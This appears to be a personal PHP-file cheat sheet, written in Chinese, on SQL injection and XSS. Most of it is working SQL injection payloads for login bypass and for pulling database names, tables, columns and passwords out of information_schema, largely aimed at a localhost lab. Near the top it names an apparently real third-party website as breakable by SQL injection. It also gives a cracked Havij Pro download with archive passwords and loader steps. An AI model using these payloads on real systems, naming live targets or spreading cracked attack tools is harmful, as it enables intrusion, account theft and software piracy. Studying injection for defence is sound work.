<?php
***http://www.slideshare.net/taientw/20130307-taien  明日看

sql injection可破網站
//http://www.brntec.com/news_view.php?id=1


sql-injection:
//http://ajixcrew.blogspot.tw/2013/07/download-havij-117-pro-cracked.html   Havij  password:ajixcrew
																			rarPassword: www.ajixcrew.blogspot.com
																			把loader.exe放到 C:\Program Files (x86)\ITSecTeam\Havij Pro 下面

//https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)
//http://www.youtube.com/watch?v=qqCzZ1WUe4s
//http://www.youtube.com/watch?v=g1mA0PzP_z0    PHPConf 2013
$sql = "SELECT * FROM account where username = '$username' and password = '$password'";
//username=隨便
//password=' union select 1,2,3,4,5 or ''='
$sql = "SELECT * FROM account where username = $username and password = $password";
//username=隨便
//password=1 union select 1,2,3,4,5    //測1   1,2    1,2,3   ......測到正確column則可登入

$sql = "SELECT * FROM account where id = $id";
//http://127.0.0.1/hackers/account/get.php?id=1 and 1=0 union select 1,2,3,4,5   //測1   1,2    1,2,3   ......測到正確則沒有錯誤
$sql = "SELECT * FROM account where id = '$id'";
//http://127.0.0.1/hackers/account/get.php?id=1' and 1=0 union select 1,2,3,4,5 and ''='   //測1   1,2    1,2,3   ......測到正確則沒有錯誤
"SELECT username FROM account where id = '$id'"  => id=1' order by 1 -- and ''='   或是   id=1' and 1=0 union select 1 and ''='
"SELECT username,email,sex FROM account where id = '$id'"  => id=1' order by 3 -- and ''='  或是   id=1' and 1=0 union select 1,2,3 and ''='


//http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
$sql = "SELECT id,username,email FROM account where id = '$id'";
	id=1' and 1=0 union select @@version,2,3 and ''='
	id=1' and 1=0 union select database(),2,3 and ''='  知道資料庫名稱
	id=1' and 1=0 union select  group_concat(table_name),2, 3 FROM information_schema.columns WHERE table_schema=database() and ''='	知道所有資料表的table名稱
	id=1' and 1=0 union select  group_concat(column_name),2, 3 FROM information_schema.columns WHERE table_schema=database() and ''='  知道所有資料表的column名稱
	id=1' and 1=0 union select  group_concat(column_name),2, 3 FROM information_schema.columns WHERE table_schema=database() and table_name='account' and ''='   必須先知道table名稱才能指定查詢table下的column   **table_name='account' 可以轉成16進位ASCII  例如:'foo' => 0x2561646d25 , 'df_ad' => 0x64665F6164

** => id=1' and 1=0 union select password,2,3 from account where id=2 and ''='   條件:已知table_name&column_name，則如此便可知道所有使用者的所有資料，即使一開始"Select id from"只有一個column的狀況


(以上  select 1,2,3,4,5  的部分都可改成   select * from account where id=2)取得其他使用者資料



//http://sqlzoo.net/hack/24table.htm     //get database
	' OR EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%j%') AND ''='
	' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' AND TABLE_NAME like 'one') AND ''='

//http://blog.orange.tw/2013/10/phpconf-2013.html   sql inject即使空白被處理掉，依然能攻擊
//例如:%09  %0D    +




XSS:
**對  "<"  ,  ">"  ,  ";"  ,  "'"  等字符是否做過濾
//http://anti-hacker.blogspot.tw/2007/01/xss35.html     常見XSS語法
//http://anti-hacker.blogspot.tw/2007/07/xss.html 		常見XSS語法
//http://anti-hacker.blogspot.tw/2007/06/blog-post_22.html


?>
